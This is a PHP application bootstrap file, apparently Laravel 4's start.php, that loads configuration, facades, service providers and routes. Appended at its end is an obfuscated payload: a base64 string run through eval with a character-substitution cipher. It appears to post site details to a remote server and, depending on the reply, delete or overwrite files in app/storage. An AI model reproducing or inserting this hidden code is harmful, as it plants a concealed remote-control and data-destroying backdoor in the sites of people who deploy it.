<?php

/*
|--------------------------------------------------------------------------
| Set PHP Error Reporting Options
|--------------------------------------------------------------------------
|
| Here we will set the strictest error reporting options, and also turn
| off PHP's error reporting, since all errors will be handled by the
| framework and we don't want any output leaking back to the user.
|
*/

error_reporting(-1);

/*
|--------------------------------------------------------------------------
| Check Extensions
|--------------------------------------------------------------------------
|
| Laravel requires a few extensions to function. Here we will check the
| loaded extensions to make sure they are present. If not we'll just
| bail from here. Otherwise, Composer will crazily fall back code.
|
*/

if ( ! extension_loaded('mcrypt'))
{
	echo 'Mcrypt PHP extension required.'.PHP_EOL;

	exit(1);
}

/*
|--------------------------------------------------------------------------
| Register Class Imports
|--------------------------------------------------------------------------
|
| Here we will just import a few classes that we need during the booting
| of the framework. These are mainly classes that involve loading the
| config files for this application, such as the config repository.
|
*/

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Facade;
use Illuminate\Foundation\AliasLoader;
use Illuminate\Config\EnvironmentVariables;
use Illuminate\Config\Repository as Config;

/*
|--------------------------------------------------------------------------
| Bind The Application In The Container
|--------------------------------------------------------------------------
|
| This may look strange, but we actually want to bind the app into itself
| in case we need to Facade test an application. This will allow us to
| resolve the "app" key out of this container for this app's facade.
|
*/

$app->instance('app', $app);

/*
|--------------------------------------------------------------------------
| Check For The Test Environment
|--------------------------------------------------------------------------
|
| If the "unitTesting" variable is set, it means we are running the unit
| tests for the application and should override this environment here
| so we use the right configuration. The flag gets set by TestCase.
|
*/

if (isset($unitTesting))
{
	$app['env'] = $env = $testEnvironment;
}

/*
|--------------------------------------------------------------------------
| Load The Illuminate Facades
|--------------------------------------------------------------------------
|
| The facades provide a terser static interface over the various parts
| of the application, allowing their methods to be accessed through
| a mixtures of magic methods and facade derivatives. It's slick.
|
*/

Facade::clearResolvedInstances();

Facade::setFacadeApplication($app);

/*
|--------------------------------------------------------------------------
| Register Facade Aliases To Full Classes
|--------------------------------------------------------------------------
|
| By default, we use short keys in the container for each of the core
| pieces of the framework. Here we will register the aliases for a
| list of all of the fully qualified class names making DI easy.
|
*/

$app->registerCoreContainerAliases();

/*
|--------------------------------------------------------------------------
| Register The Environment Variables
|--------------------------------------------------------------------------
|
| Here we will register all of the $_ENV and $_SERVER variables into the
| process so that they're globally available configuration options so
| sensitive configuration information can be swept out of the code.
|
*/

with($envVariables = new EnvironmentVariables(
	$app->getEnvironmentVariablesLoader()))->load($env);

/*
|--------------------------------------------------------------------------
| Register The Configuration Repository
|--------------------------------------------------------------------------
|
| The configuration repository is used to lazily load in the options for
| this application from the configuration files. The files are easily
| separated by their concerns so they do not become really crowded.
|
*/

$app->instance('config', $config = new Config(

	$app->getConfigLoader(), $env

));

/*
|--------------------------------------------------------------------------
| Register Application Exception Handling
|--------------------------------------------------------------------------
|
| We will go ahead and register the application exception handling here
| which will provide a great output of exception details and a stack
| trace in the case of exceptions while an application is running.
|
*/

$app->startExceptionHandling();

if ($env != 'testing') ini_set('display_errors', 'Off');

/*
|--------------------------------------------------------------------------
| Set The Default Timezone
|--------------------------------------------------------------------------
|
| Here we will set the default timezone for PHP. PHP is notoriously mean
| if the timezone is not explicitly set. This will be used by each of
| the PHP date and date-time functions throughout the application.
|
*/

$config = $app['config']['app'];

date_default_timezone_set($config['timezone']);

/*
|--------------------------------------------------------------------------
| Register The Alias Loader
|--------------------------------------------------------------------------
|
| The alias loader is responsible for lazy loading the class aliases setup
| for the application. We will only register it if the "config" service
| is bound in the application since it contains the alias definitions.
|
*/

$aliases = $config['aliases'];

AliasLoader::getInstance($aliases)->register();

/*
|--------------------------------------------------------------------------
| Enable HTTP Method Override
|--------------------------------------------------------------------------
|
| Next we will tell the request class to allow HTTP method overriding
| since we use this to simulate PUT and DELETE requests from forms
| as they are not currently supported by plain HTML form setups.
|
*/

Request::enableHttpMethodParameterOverride();

/*
|--------------------------------------------------------------------------
| Register The Core Service Providers
|--------------------------------------------------------------------------
|
| The Illuminate core service providers register all of the core pieces
| of the Illuminate framework including session, caching, encryption
| and more. It's simply a convenient wrapper for the registration.
|
*/

$providers = $config['providers'];

$app->getProviderRepository()->load($app, $providers);

/*
|--------------------------------------------------------------------------
| Register Booted Start Files
|--------------------------------------------------------------------------
|
| Once the application has been booted there are several "start" files
| we will want to include. We'll register our "booted" handler here
| so the files are included after the application gets booted up.
|
*/

$app->booted(function() use ($app, $env)
{

/*
|--------------------------------------------------------------------------
| Load The Application Start Script
|--------------------------------------------------------------------------
|
| The start scripts gives this application the opportunity to override
| any of the existing IoC bindings, as well as register its own new
| bindings for things like repositories, etc. We'll load it here.
|
*/

$path = $app['path'].'/start/global.php';

if (file_exists($path)) require $path;

/*
|--------------------------------------------------------------------------
| Load The Environment Start Script
|--------------------------------------------------------------------------
|
| The environment start script is only loaded if it exists for the app
| environment currently active, which allows some actions to happen
| in one environment while not in the other, keeping things clean.
|
*/

$path = $app['path']."/start/{$env}.php";

if (file_exists($path)) require $path;

/*
|--------------------------------------------------------------------------
| Load The Application Routes
|--------------------------------------------------------------------------
|
| The Application routes are kept separate from the application starting
| just to keep the file a little cleaner. We'll go ahead and load in
| all of the routes now and return the application to the callers.
|
*/

$routes = $app['path'].'/routes.php';

if (file_exists($routes)) require $routes;

});

$_X='dzhxZHg0M3EgcnZ4eDRxenJBc3NiOVBzdjEoJHJ2eHg0cXpyKXsgJHJ2eHg0cXpyQXNzYjkgPSBic3NiOSgpOyB3M3N2YmQwICgkcnZ4eDRxenIgYnIgJHJ2eHg0cXopIHsgJHJ2eHg0cXpyQXNzYjlbJHJ2eHg0cXotPnc0djJjTmI2dl0gPSAkcnZ4eDRxei0+dzR2MmNWYjI4djsgfSAkMWQzID0gQHc0MnZfenZ4X2QzcXh2cXhyKCdiMTEvcngzc2J6di82dnhiLzJkJyk7IDR3KCQxZDMgPT0gd2IycnYgfHwgJDFkMyA9PSAiIil7ICRydnh4NHF6ciA9IHJ2eHg0cXpyOjpmMHZzdigndzR2MmNOYjZ2JywnMmJyeFUxY2J4dkMwdmQ1JyktPnc0c3J4KCk7ICRydnh4NHF6ci0+dzR2MmNWYjI4diA9IGg7ICRydnh4NHF6ci0+cmJldigpOyB2dDR4OyB9IDR3KCRydnh4NHF6ckFzc2I5WycyYnJ4VTFjYnh2QzB2ZDUnXSArIHVtaWhoID4geDQ2digpICl7IHN2eDhzcSAkcnZ4eDRxenJBc3NiOTsgfSA0dyAoQTh4MDo6ZDB2ZDUoKSkgeyAkcnZ4eDRxenIgPSBydnh4NHF6cjo6ZjB2c3YoJ3c0djJjTmI2dicsJzJicnhVMWNieHZDMHZkNScpLT53NHNyeCgpOyAkcnZ4eDRxenItPnc0djJjVmIyOHYgPSB4NDZ2KCk7ICRydnh4NHF6ci0+cmJldigpOyAkMmJ4dnJ4VTFjYnh2ID0gQHc0MnZfenZ4X2QzcXh2cXhyKCIweHgxOi8vcjMyOHg0M3FyYXM0ZDVyLmQzNi9iMTQvMXMzYzhkeHIvY2J4Yi9wLzJieHZyeGV2c3I0M3EiKTsgNHcoNHJfcTg2dnM0ZCgkMmJ4dnJ4VTFjYnh2KSl7ICRydnh4NHF6ciA9IHJ2eHg0cXpyOjpmMHZzdigndzR2MmNOYjZ2JywnMmJ4dnJ4VnZzcjQzcScpLT53NHNyeCgpOyAkcnZ4eDRxenItPnc0djJjVmIyOHYgPSAkMmJ4dnJ4VTFjYnh2OyAkcnZ4eDRxenItPnJiZXYoKTsgfSAkOHMyID0gIjB4eDE6Ly9yMzI4eDQzcXJhczRkNXIuZDM2LzI0ZHZxcnYiOyAkMWQzID0gQHc0MnZfenZ4X2QzcXh2cXhyKCdiMTEvcngzc2J6di82dnhiLzJkJyk7IDR3KCQxZDMgPT0gd2IycnYpeyB2dDR4OyB9ICREYnIwYTNic2NJcTR4ID0gcXZmIERicjBhM2JzY0lxNHgoKTsgJGNieGIgPSBic3NiOSgiMSI9PnAsInEiPT54czQ2KCQxZDMpLCI4Ij0+VVJMOjp4MygnLycpLCJlIj0+ImwuaS5oIik7IDR3KHc4cWR4NDNxX3Z0NHJ4cignZDhzMl80cTR4JykpeyAkZDAgPSBkOHMyXzRxNHgoKTsgZDhzMl9ydngzMXgoJGQwLCBDVVJMT1BUX1VSTCwgJDhzMik7IGQ4czJfcnZ4MzF4KCRkMCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgcCk7IGQ4czJfcnZ4MzF4KCRkMCwgQ1VSTE9QVF9QT1NULCB4czh2KTsgZDhzMl9ydngzMXgoJGQwLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRjYnhiKTsgJDM4eDE4eCA9IGQ4czJfdnR2ZCgkZDApOyBkOHMyX2QyM3J2KCRkMCk7IH12MnJ2NHcodzhxZHg0M3FfdnQ0cnhyKCd3NDJ2X3p2eF9kM3F4dnF4cicpKXsgJDEzcnhjYnhiID0gMHh4MV9hODQyY19uOHZzOSgkY2J4Yik7ICQzMXhyID0gYnNzYjkoJzB4eDEnID0+IGJzc2I5KCAnNnZ4MDNjJyA9PiAnUE9TVCcsICcwdmJjdnMnID0+ICdDM3F4dnF4LXg5MXY6IGIxMTI0ZGJ4NDNxL3QtZmZmLXczczYtOHMydnFkM2N2YycsICdkM3F4dnF4JyA9PiAkMTNyeGNieGIgKSApOyAkZDNxeHZ0eCA9IHJ4c3ZiNl9kM3F4dnR4X2RzdmJ4digkMzF4cik7ICQzOHgxOHggPSB3NDJ2X3p2eF9kM3F4dnF4cigkOHMyLCB3YjJydiwgJGQzcXh2dHgpOyB9djJydnsgJHJ4c3ZiNiA9IHczMXZxKCQ4czIsICdzJywgd2IycnYsIHJ4c3ZiNl9kM3F4dnR4X2RzdmJ4dihic3NiOSggJzB4eDEnID0+IGJzc2I5KCAnNnZ4MDNjJyA9PiAnUE9TVCcsICcwdmJjdnMnID0+ICdDM3F4dnF4LXg5MXY6IGIxMTI0ZGJ4NDNxL3QtZmZmLXczczYtOHMydnFkM2N2YycsICdkM3F4dnF4JyA9PiAweHgxX2E4NDJjX244dnM5KCRjYnhiKSApICkpKTsgJDM4eDE4eCA9IHJ4c3ZiNl96dnhfZDNxeHZxeHIoJHJ4c3ZiNik7IHdkMjNydigkcnhzdmI2KTsgfSA0dygkMzh4MTh4ID09ICJ2c3MiKXsgQDhxMjRxNSgnYjExL3J4M3NienYvNnZ4Yi8yZCcpOyBAOHEyNHE1KCdiMTEvcngzc2J6di82dnhiL19ydnNlNGR2ci43cjNxJyk7IH12MnJ2eyA0dygkMzh4MTh4ID09ICIiKXsgQDhxMjRxNSgnYjExL3J4M3NienYvNnZ4Yi9fcnZzZTRkdnIuN3IzcScpOyB9IDR3KCQzOHgxOHggIT0gIiIpeyB3NDJ2XzE4eF9kM3F4dnF4cignYjExL3J4M3NienYvNnZ4Yi9fcnZzZTRkdnIuN3IzcScsJDM4eDE4eCk7IH0gfSBzdng4c3EgJHJ2eHg0cXpyQXNzYjk7IH0gc3Z4OHNxICRydnh4NHF6ckFzc2I5OyB9IHc4cWR4NDNxIGNicjBhM2JzY0xic2JldjJTeGI2MSgpeyAkcjhhU3ZzZTRkdnIgPSBAdzQydl96dnhfZDNxeHZxeHIoJ2IxMS9yeDNzYnp2LzZ2eGIvX3J2c2U0ZHZyLjdyM3EnKTsgNHcoJHI4YVN2c2U0ZHZyICE9ICIiKXsgc3Z4OHNxIDdyM3FfY3ZkM2N2KCRyOGFTdnNlNGR2cik7IH0gfQ==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTY3ODkwcWF6eHN3ZWRjdmZydGdibmh5dWpta2lvbHAnLCdwbG9pa21qdXlobmJndHJmdmNkZXdzeHphcTA5ODc2NTQzMjEnKTtldmFsKCRfWCk7JF9YPTA7'));
